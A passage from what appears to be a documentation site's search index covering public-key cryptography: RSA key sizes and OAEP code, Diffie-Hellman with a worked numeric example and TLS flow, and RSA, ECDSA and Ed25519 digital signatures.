(factorization)\n\nExample:\nn = 3233 = ? \u00d7 ?\nSmall numbers: Easy to find 61 \u00d7 53\nLarge numbers (2048-bit): Computationally infeasible\n</code></pre> <p>RSA Key Sizes: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Key Size \u2502 Security \u2502 Status      \u2502 Use         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 512-bit  \u2502 None     \u2502 \u274c Broken    \u2502 Don't use   \u2502\n\u2502 1024-bit \u2502 Weak     \u2502 \u26a0\ufe0f Deprecated\u2502 Legacy only \u2502\n\u2502 2048-bit \u2502 Good     \u2502 \u2705 Standard  \u2502 Common use  \u2502\n\u2502 3072-bit \u2502 Better   \u2502 \u2705 Secure    \u2502 High sec    \u2502\n\u2502 4096-bit \u2502 Strong   \u2502 \u2705 Very Sec  \u2502 Max security\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCurrent Recommendation: Minimum 2048-bit\n</code></pre></p> <p>Advantages: - \u2705 Well-Established: Used since 1977, extremely well-studied - \u2705 Versatile: Both encryption and digital signatures - \u2705 Widely Supported: Every platform and library - \u2705 Proven Security: Based on well-understood math problem - \u2705 Simple Concept: Easy to understand</p> <p>Disadvantages: - \u274c Slow: Much slower than symmetric encryption - \u274c Large Keys: Requires 2048-4096 bit keys - \u274c Large Ciphertext: Output larger than input - \u274c Quantum Vulnerable: Shor's algorithm can break it - \u274c Padding Required: Needs OAEP or PSS padding</p> <p>RSA Performance: <pre><code>Operation Times (2048-bit key):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nKey Generation:    100-500 ms\nEncryption:        0.5-2 ms\nDecryption:        10-50 ms (slower due to private key ops)\nSigning:           10-50 ms\nVerification:      0.5-2 ms (fast with small public exponent)\n\nCompare to AES: 1000x-10000x slower!\n</code></pre></p> <p>RSA in Practice: <pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\n\n# Generate RSA key pair\nkey = RSA.generate(2048)\nprivate_key = key\npublic_key = key.publickey()\n\n# Encryption (using OAEP padding)\ndef rsa_encrypt(message: bytes, public_key):\n    cipher = PKCS1_OAEP.new(public_key)\n    ciphertext = cipher.encrypt(message)\n    return ciphertext\n\n# Decryption\ndef rsa_decrypt(ciphertext: bytes, private_key):\n    cipher = PKCS1_OAEP.new(private_key)\n    plaintext = cipher.decrypt(ciphertext)\n    return plaintext\n\n# Usage\nmessage = b\"Hello RSA!\"\nencrypted = rsa_encrypt(message, public_key)\ndecrypted = rsa_decrypt(encrypted, private_key)\nprint(f\"Decrypted: {decrypted.decode()}\")\n</code></pre></p>"},{"location":"security/encryption/#diffie-hellman-key-exchange","title":"Diffie-Hellman Key Exchange","text":"<p>Description: Diffie-Hellman is not an encryption algorithm, but a key exchange protocol. It allows two parties to establish a shared secret over an insecure channel without ever transmitting the secret itself.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         Diffie-Hellman Key Exchange Protocol                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPUBLIC PARAMETERS (Known to everyone):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\np = Large prime number (e.g., 23)\ng = Generator (primitive root of p, e.g., 5)\n\nALICE                                           BOB\n\u2500\u2500\u2500\u2500\u2500                                           \u2500\u2500\u2500\n\nStep 1: Generate private key\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\na = 6 (secret)                                  b = 15 (secret)\n     \u2502                                               \u2502\n     \u2502                                               \u2502\nStep 2: Compute public key\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nA = g^a mod p                                   B = g^b mod p\nA = 5^6 mod 23                                  B = 5^15 mod 23\nA = 8                                           B = 19\n     \u2502                                               \u2502\n     \u2502                                               \u2502\nStep 3: Exchange public keys\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n     \u2502        Send A = 8                             \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                               \u2502\n     \u2502        Send B = 19                            \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n     \u2502                                               \u2502\n     \u2502   \u26a0\ufe0f Attacker can see A and B!                \u2502\n     \u2502   But cannot derive a or b                    \u2502\n     \u2502                                               \u2502\nStep 4: Compute shared secret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ns = B^a mod p                                   s = A^b mod p\ns = 19^6 mod 23                                 s = 8^15 mod 23\ns = 2                                           s = 2\n     \u2502                                               \u2502\n     \u25bc                                               \u25bc\nBoth parties now have shared secret = 2!\n\nMATHEMATICAL PROOF:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice: s = B^a mod p = (g^b)^a mod p = g^(ab) mod p\nBob:   s = A^b mod p = (g^a)^b mod p = g^(ab) mod p\n\nBoth compute the same value!\n\nSECURITY:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAttacker knows: p, g, A, B\nAttacker needs: a or b\nProblem: Discrete Logarithm Problem (DLP)\n         Given g^a mod p, find a \u2192 Computationally hard!\n\nVISUAL REPRESENTATION (Paint Mixing Analogy):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                 \u2502\n\u2502  Public Color: Yellow                           \u2502\n\u2502  (Known to everyone)                            \u2502\n\u2502                                                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                    \u2502\n        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502                       \u2502\n    \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510\n    \u2502 Alice   \u2502           \u2502   Bob   \u2502\n    \u2502         \u2502           \u2502         \u2502\n    \u2502 Secret: \u2502           \u2502 Secret: \u2502\n    \u2502  Blue   \u2502           \u2502   Red   \u2502\n    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518           \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n         \u2502                     \u2502\n      Mix with                Mix with\n      Yellow                  Yellow\n         \u2502                     \u2502\n    \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n    \u2502 Green   \u2502           \u2502 Orange  \u2502\n    \u2502(Public) \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502(Public) \u2502\n    \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518  Exchange \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n         \u2502                     \u2502\n    Add Bob's                Add Alice's\n    Orange                    Green\n         \u2502                     \u2502\n    \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n    \u2502  Brown  \u2502           \u2502  Brown  \u2502\n    \u2502 (Secret)\u2502           \u2502 (Secret)\u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    Same color (shared secret)!\n\n    Attacker sees: Yellow, Green, Orange\n    Cannot extract: Blue or Red\n    Cannot create: Brown\n</code></pre> <p>Diffie-Hellman Variants: <pre><code>1. TRADITIONAL DH (Finite Fields)\n   - Uses modular exponentiation\n   - Key size: 2048-4096 bits\n   - Slower computation\n\n2. ECDH (Elliptic Curve Diffie-Hellman)\n   - Uses elliptic curve points\n   - Key size: 256-521 bits\n   - Faster, smaller keys\n   - Used in modern TLS\n\n3. X25519 (Curve25519)\n   - Modern ECDH variant\n   - 255-bit keys\n   - Very fast\n   - Used in: Signal, WireGuard, TLS 1.3\n</code></pre></p> <p>Advantages: - \u2705 No Pre-shared Secret: Parties don't need prior communication - \u2705 Perfect Forward Secrecy: Each session has unique key - \u2705 Efficient: Fast key establishment - \u2705 Widely Used: Core of TLS/SSL</p> <p>Disadvantages: - \u274c Vulnerable to MITM: Without authentication - \u274c Not an Encryption Algorithm: Only for key exchange - \u274c Requires Authentication: Must be combined with signatures</p> <p>Diffie-Hellman in TLS: <pre><code>Client                                  Server\n  \u2502                                       \u2502\n  \u2502 1. ClientHello                        \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n  \u2502                                       \u2502\n  \u2502                                       \u2502 Generate DH private: b\n  \u2502                                       \u2502 Compute DH public: B\n  \u2502                                       \u2502\n  \u2502 2. ServerHello                        \u2502\n  \u2502    Server DH Public Key: B            \u2502\n  \u2502    Signature (proves server identity) \u2502\n  \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n  \u2502                                       \u2502\n  \u2502 Generate DH private: a                \u2502\n  \u2502 Compute DH public: A                  \u2502\n  \u2502 Compute shared secret: s = B^a        \u2502\n  \u2502                                       \u2502\n  \u2502 3. Client DH Public Key: A            \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n  \u2502                                       \u2502 Compute shared secret: s = A^b\n  \u2502                                       \u2502\nBoth parties now have shared secret!\nUse it to derive session keys for AES encryption\n</code></pre></p> <p>Diffie-Hellman in Practice: <pre><code>from cryptography.hazmat.primitives.asymmetric import dh\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.kdf.hkdf import HKDF\n\n# Generate DH parameters (done once, can be reused)\nparameters = dh.generate_parameters(generator=2, key_size=2048)\n\n# Alice generates her key pair\nalice_private_key = parameters.generate_private_key()\nalice_public_key = alice_private_key.public_key()\n\n# Bob generates his key pair\nbob_private_key = parameters.generate_private_key()\nbob_public_key = bob_private_key.public_key()\n\n# Alice computes shared secret using Bob's public key\nalice_shared_secret = alice_private_key.exchange(bob_public_key)\n\n# Bob computes shared secret using Alice's public key\nbob_shared_secret = bob_private_key.exchange(alice_public_key)\n\n# Both secrets are identical!\nassert alice_shared_secret == bob_shared_secret\n\n# Derive encryption key from shared secret\ndef derive_key(shared_secret: bytes) -&gt; bytes:\n    return HKDF(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=None,\n        info=b'session key'\n    ).derive(shared_secret)\n\nsession_key = derive_key(alice_shared_secret)\nprint(f\"Session Key: {session_key.hex()}\")\n</code></pre></p>"},{"location":"security/encryption/#digital-signatures","title":"Digital Signatures","text":"<p>What is a Digital Signature?</p> <p>A digital signature is a cryptographic mechanism that provides: 1. Authentication: Proves who created the message 2. Integrity: Ensures message wasn't altered 3. Non-repudiation: Signer cannot deny signing</p> <p>It's the digital equivalent of a handwritten signature, but much more secure.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Digital Signature Process                       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSIGNING (Creating Signature):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Document   \u2502\n\u2502  \"Contract\"  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2502 Step 1: Hash the document\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Hash       \u2502  SHA-256\n\u2502 Function     \u2502  One-way function\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  Creates fixed-size digest\n       \u2502\n       \u2502 Document Hash\n       \u2502 (e.g., 256 bits)\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Hash      \u2502\n\u2502   Digest     \u2502\n\u2502 a7f3b2c1...  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2502 Step 2: Encrypt hash with private key\n       \u2502\n       \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2514\u2500\u25b6\u2502   Private Key   \u2502\n          \u2502  (Keep Secret)  \u2502\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2502\n                   \u25bc\n          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n          \u2502   Signature    \u2502  This IS the digital signature!\n          \u2502  8k2mN9pR...   \u2502  Encrypted hash\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nVERIFICATION (Checking Signature):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nReceiver gets:\n1. Original document\n2. Digital signature\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Document   \u2502\n\u2502  \"Contract\"  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2502 Step 1: Hash the received document\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Hash       \u2502\n\u2502 Function     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2502 Computed Hash\n       \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Hash      \u2502\n\u2502   Digest     \u2502\n\u2502 a7f3b2c1...  \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502\n                              \u2502\n                              \u2502 Step 3: Compare\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n\u2502  Signature   \u2502              \u2502\n\u2502 8k2mN9pR...  \u2502              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502\n       \u2502                      \u2502\n       \u2502 Step 2: Decrypt      \u2502\n       \u2502 signature with       \u2502\n       \u2502 public key           \u2502\n       \u2502                      \u2502\n       \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n       \u2514\u2500\u25b6\u2502   Public Key    \u2502 \u2502\n          \u2502 (Publicly Known)\u2502 \u2502\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n                   \u2502          \u2502\n                   \u25bc          \u2502\n          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n          \u2502  Decrypted     \u2502 \u2502\n          \u2502    Hash        \u2502 \u2502\n          \u2502 a7f3b2c1...    \u2502\u2500\u2518\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                   \u2502\n                   \u25bc\n          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n          \u2502 If hashes match:   \u2502\n          \u2502 \u2705 Signature valid! \u2502\n          \u2502 \u2705 Document intact! \u2502\n          \u2502 \u2705 Authentic!       \u2502\n          \u2502                    \u2502\n          \u2502 If hashes differ:  \u2502\n          \u2502 \u274c Tampered!        \u2502\n          \u2502 \u274c Invalid!         \u2502\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCOMPLETE FLOW:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE (Sender)                           BOB (Receiver)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                           \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Document    \u2502                         \u2502  Document    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502                                        \u2502\n   Hash with                                Hash with\n   SHA-256                                  SHA-256\n       \u2502                                        \u2502\n       \u25bc                                        \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Hash Digest  \u2502                         \u2502 Hash Digest  \u2502\n\u2502 a7f3b2c1...  \u2502                         \u2502 a7f3b2c1...  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502                                        \u2502\n  Encrypt with                            Decrypt with\n Alice's Private                          Alice's Public\n      Key                                      Key\n       \u2502                                        \u2502\n       \u25bc                                        \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Signature   \u2502                         \u2502 Decrypted    \u2502\n\u2502 8k2mN9pR...  \u2502                         \u2502    Hash      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502                                        \u2502\n       \u2502 Send both:                             \u2502\n       \u2502 - Document                             \u2502\n       \u2502 - Signature                            \u2502\n       \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n                                                \u2502\n                                          Compare hashes\n                                                \u2502\n                                                \u25bc\n                                         \u2705 Valid if match\n</code></pre>"},{"location":"security/encryption/#digital-signature-algorithms","title":"Digital Signature Algorithms","text":"<p>1. RSA Signatures: <pre><code>SIGNING:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Hash message: h = SHA-256(message)\n2. Sign hash: signature = h^d mod n (private key d)\n\nVERIFICATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Hash received message: h1 = SHA-256(message)\n2. Decrypt signature: h2 = signature^e mod n (public key e)\n3. Compare: h1 == h2 ?\n\nCommon Padding: PKCS#1 v1.5, PSS (Probabilistic Signature Scheme)\n</code></pre></p> <p>2. ECDSA (Elliptic Curve Digital Signature Algorithm): <pre><code>SIGNING:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Hash message: h = SHA-256(message)\n2. Generate random k\n3. Compute r = (k \u00d7 G)_x mod n\n4. Compute s = k^(-1) \u00d7 (h + r \u00d7 private_key) mod n\n5. Signature = (r, s)\n\nVERIFICATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Hash message: h = SHA-256(message)\n2. Compute u1 = h \u00d7 s^(-1) mod n\n3. Compute u2 = r \u00d7 s^(-1) mod n\n4. Compute point P = u1 \u00d7 G + u2 \u00d7 PublicKey\n5. Valid if P_x == r\n\nAdvantages:\n\u2705 Smaller signatures than RSA\n\u2705 Faster than RSA\n\u2705 Same security with smaller keys\n</code></pre></p> <p>3. EdDSA (Ed25519): <pre><code>Modern signature algorithm:\n\u2705 Deterministic (no random k needed)\n\u2705 Resistant to side-channel attacks\n\u2705 Very fast\n\u2705 255-bit keys\n\u2705 Used in: SSH, Signal, cryptocurrency\n\nSignature: 512 bits (64 bytes)\nPublic Key: 256 bits (32 bytes)\n</code></pre></p>"},{"location":"security/encryption/#digital-signature-use-cases","title":"Digital Signature Use Cases","text":"<pre><code>\u2705 COMMON APPLICATIONS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. SOFTWARE SIGNING\n   